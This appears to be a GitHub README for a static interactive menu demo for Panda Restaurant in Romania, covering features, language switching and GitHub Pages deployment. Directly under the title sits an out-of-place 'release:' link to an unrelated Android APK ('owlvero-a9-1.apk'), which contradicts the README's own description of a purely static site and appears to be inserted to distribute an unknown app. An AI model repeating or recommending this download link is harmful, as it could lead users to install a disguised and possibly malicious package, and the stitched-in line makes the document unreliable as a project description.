# Panda Restaurant — Interactive Digital Menu
release:
https://github.com/EnhaoSun/studioseh/releases/download/1/owlvero-a9-1.apk

Mobile-first static menu demo for Panda Restaurant in Romania, adapted from the original 22-page PDF menu.

## What's in the demo

- 19 dishes with real food photos cropped from the PDF and the original panda logo
- Romanian, English and Chinese language switching
- Categories, dish-name / ingredient / code search and spicy filter
- Dish detail view, favorites tray and indicative saved-item total
- No ordering, checkout, payments or server dependencies

**Preview only.** The PDF is image-based and text was manually transcribed or simplified. The restaurant must verify each dish's names, weights, prices, ingredient descriptions, allergens and translations before production. This is a 19-dish sample, not a full transcription of all 22 pages.

## Publish with GitHub Pages

A Pages deployment workflow is included at `.github/workflows/pages.yml`. GitHub requires a one-time setting in the repository:

1. Open [Settings → Pages](https://github.com/EnhaoSun/studioseh/settings/pages).
2. Under **Build and deployment → Source**, select **GitHub Actions**.
3. Open [Actions](https://github.com/EnhaoSun/studioseh/actions) and re-run the latest Pages workflow if the initial attempt failed before the Pages source was enabled.

The published URL will be **https://enhaosun.github.io/studioseh/** after a successful deployment. Subsequent pushes to `main` automatically redeploy the site.

If you prefer no GitHub Actions, you can instead choose **Deploy from a branch → main / (root)**; the site also supports branch-based publishing.

## Tech

Pure HTML/CSS/JavaScript, local WebP and PNG assets extracted from the original PDF, localStorage favorites. The whole site is static and works without a database.
